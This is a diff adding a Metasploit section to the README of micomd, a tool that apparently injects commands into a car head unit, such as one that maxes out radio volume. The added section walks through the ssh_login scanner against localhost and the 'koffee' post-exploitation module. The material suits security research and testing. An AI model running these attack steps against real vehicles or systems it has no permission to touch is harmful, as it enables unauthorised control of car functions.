@@ -29,3 +29,24 @@ make all
 All available commands are in the `refcodes.json` file. For example, `./micomd -c inject 0112 f0` toggles maximum radio volume.
 
 If the commands are successfully injected, watchdog should print out messages identifying each command.
+
+### With Metasploit
+
+Below is an example of establishing a Metasploit session with your local machine.
+
+```bash
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(ssh_login) > set rhosts 127.0.0.1
+msf auxiliary(ssh_login) > set username <your username>
+msf auxiliary(ssh_login) > set password <your password>
+msf auxiliary(ssh_login) > exploit
+
+# At this point you should have a session with id `1`. To
+# make sure, you can list all your sessions:
+msf > sessions -l
+
+msf > use post/android/local/koffee
+msf post(koffee) > set session 1 # or your session id
+msf post(koffee) > set micomd <path to micomd>
+msf post(koffee) > exploit # or other actions
+```
